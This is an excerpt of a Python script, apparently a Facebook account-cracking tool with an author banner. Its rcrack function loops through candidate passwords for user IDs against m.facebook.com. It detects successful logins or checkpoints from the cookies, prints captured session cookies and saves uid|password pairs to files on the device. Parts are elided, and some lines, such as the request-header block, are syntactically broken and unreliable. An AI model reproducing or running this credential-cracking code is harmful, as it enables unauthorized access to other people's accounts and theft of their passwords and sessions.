...
os.system('espeak -a 300 " Welcome,   to,  ZACK,  King,  Tools"')
logo =("""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[0;91m ______\033[0;92m ___    __\033[0;91m ___\033[0;92m __\033[0;91m # \033[0;92m     ║
║\033[0;91m    (___ \033[0;92m   //    _    \\\033[0;91m    -\033[0;92m    -   -\033[0;91m -  \033[0;92m    ║
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-ZACK ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Zack King ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mZack-King ]   ║\33[1;34m   
╠══[Whatsapp                 • 01308447902 ]  ║\33[1;35m 
╠══[TOOLS                    • peid  ]        ║ \33[1;32m   
╠══[VERSION                  • 1.9 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
loop = 0
oks = []
cps = []
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            "pass":ps,
            "login":"Log In"}
            Request Headers= {"authority": 'm.facebook.com',
            "method": 'GET',
            "path": /
            "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[ZACK-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                os.system('espeak -a 300 " ZACK,  Ok,  id"')
                cek_apk(session,coki)
                open('/sdcard/ZACK-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
               # print('\r\r\33[1;30m[ZACK-CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
                #os.system("play op.mp3")
                os.system('espeak -a 300 " C,  p"')
                open('/sdcard/ZACK-CP😁😁.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}ZACK-XD{x}]>~[%s]>~<[%s]-[OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
